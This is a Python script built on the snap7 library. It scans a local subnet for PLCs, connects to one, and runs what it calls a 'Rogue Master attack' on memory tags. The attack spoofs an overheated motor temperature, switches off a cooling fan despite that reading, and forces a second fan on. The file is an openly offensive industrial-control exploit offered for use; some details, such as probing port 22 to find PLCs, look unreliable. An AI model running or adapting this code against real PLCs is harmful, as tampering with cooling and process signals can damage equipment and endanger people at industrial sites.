import snap7
import time
import socket

# Configuration
PLC_IP = None  # Will be discovered if None
PLC_RACK = 0
PLC_SLOT = 1
LOCAL_TSAP = 0x0300  # Adjust if necessary, this is a common one
TARGET_TSAP = 0x0200  # Adjust if necessary, this is a common one
# Tag Definitions (Address, Data Type) -  This is the core of the Rogue Master
# These are the tags we want to influence to cause specific effects
# Note:  Modify these based on the PLC program's behavior
# This script targets activating and deactivating fans based on temperature.
TARGET_TAGS = {
    "Activate_Fan_A": {"address": 0, "offset": 0, "data_type": "bool"},  # %M0.0
    "Activate_Fan_B": {"address": 0, "offset": 1, "data_type": "bool"},  # %M0.1
    "Motor_Temp": {"address": 7, "offset": 0, "data_type": "int"}       # %MW7
}


def discover_plc_ip():
    """
    Attempts to discover the PLC's IP address by scanning the local network.
    This is a simplified example and may require adaptation based on your network setup.
    """
    # This is a placeholder for a more robust discovery mechanism.
    # In a real-world scenario, you'd likely use a network scanning tool
    # (e.g., nmap) or a dedicated PLC discovery protocol (e.g., Profinet DCP).

    # WARNING: This example uses a hardcoded subnet. DO NOT use this directly
    # in a production environment without proper testing and security considerations.
    # It can be unreliable and potentially disruptive to your network.
    subnet = "192.168.1."  # Replace with your actual subnet
    for i in range(1, 255):
        ip = subnet + str(i)
        try:
            # Attempt a simple ping (not reliable, but quick for demonstration)
            socket.create_connection((ip, 22), timeout=0.1) #check if the port is open
            print(f"Potential PLC IP: {ip}")
            # Try connecting with Snap7 to verify it's a PLC
            plc = snap7.client.Client()
            plc.set_connection_params(ip, PLC_RACK, PLC_SLOT)
            try:
                plc.connect(ip, PLC_RACK, PLC_SLOT)
                if plc.get_connected():
                    plc.disconnect()
                    return ip
            except Exception as e:
                pass  # Not a PLC, continue scanning
        except (socket.timeout, socket.error):
            pass # host don't respond
        except Exception as e:
            print(f"Error during IP discovery {ip}: {e}")

    print("PLC IP discovery failed. Please provide the IP address manually.")
    return None


def write_tag(client, tag_name, tag_details, value):
    """Writes a value to a specific tag in the PLC."""
    address = tag_details["address"]
    offset = tag_details["offset"]
    data_type = tag_details["data_type"]

    if data_type == "bool":
        byte_address = address  # Address of the byte containing the bit
        bit_offset = offset      # Offset of the bit within the byte

        # Read the existing byte
        read_data = client.read_area(snap7.const.areas.MK, 0, byte_address, 1) #Memory, DB number(not used), start addr, size of data in bytes

        # Modify the specific bit within the byte
        byte_value = read_data[0]
        if value:
            byte_value |= (1 << bit_offset)  # Set the bit
        else:
            byte_value &= ~(1 << bit_offset) # Clear the bit

        # Write the modified byte back to the PLC
        write_data = bytearray([byte_value])
        client.write_area(snap7.const.areas.MK, 0, byte_address, write_data)

    elif data_type == "int":
        # Convert integer to byte array (2 bytes for INT)
        data = value.to_bytes(2, byteorder='big')
        client.write_area(snap7.const.areas.MK, 0, address, data)  #Memory, DB number(not used), start addr, size of data in bytes
    else:
        print(f"Unsupported data type: {data_type}")
        return

    print(f"Successfully wrote {value} to tag '{tag_name}' at address %M{address}.{offset}")


def rogue_master_attack(client):
    """Executes the rogue master attack scenario."""

    print("Starting Rogue Master attack...")

    # Scenario:  Simulate overheating and force fan activation
    print("Simulating overheating...")
    write_tag(client, "Motor_Temp", TARGET_TAGS["Motor_Temp"], 350) #Set the temperature high, above 320.

    time.sleep(5)  # Give the PLC some time to react

    # Deactivate Fan A despite the high temperature (disruption)
    print("Deactivating Fan A (disrupting cooling)...")
    write_tag(client, "Activate_Fan_A", TARGET_TAGS["Activate_Fan_A"], False)

    time.sleep(5)

    # Activate Fan B regardless of temperature (unintended process state)
    print("Activating Fan B regardless of temperature...")
    write_tag(client, "Activate_Fan_B", TARGET_TAGS["Activate_Fan_B"], True)

    time.sleep(5)

    # Return to normal: Set temp back to normal and deactivate all forced states.
    print("Returning to normal state...")
    write_tag(client, "Motor_Temp", TARGET_TAGS["Motor_Temp"], 250)  #Normal temperature
    write_tag(client, "Activate_Fan_A", TARGET_TAGS["Activate_Fan_A"], False)
    write_tag(client, "Activate_Fan_B", TARGET_TAGS["Activate_Fan_B"], False)

    print("Rogue Master attack complete.")


if __name__ == "__main__":
    # IP Address Discovery
    if PLC_IP is None:
        PLC_IP = discover_plc_ip()
        if PLC_IP is None:
            print("Please provide the PLC IP address manually by setting PLC_IP in the script.")
            exit()

    print(f"Using PLC IP: {PLC_IP}")

    # Snap7 Client Setup
    plc = snap7.client.Client()
    plc.set_connection_params(PLC_IP, PLC_RACK, PLC_SLOT)
    plc.set_comm_params(LOCAL_TSAP, TARGET_TSAP) #Setting the TSAP

    try:
        plc.connect(PLC_IP, PLC_RACK, PLC_SLOT)
        if plc.get_connected():
            print("Successfully connected to the PLC.")
            rogue_master_attack(plc) # Execute the attack

        else:
            print("Failed to connect to the PLC.")


    except Exception as e:
        print(f"An error occurred: {e}")

    finally:
        if plc.get_connected():
            plc.disconnect()
            print("Disconnected from the PLC.")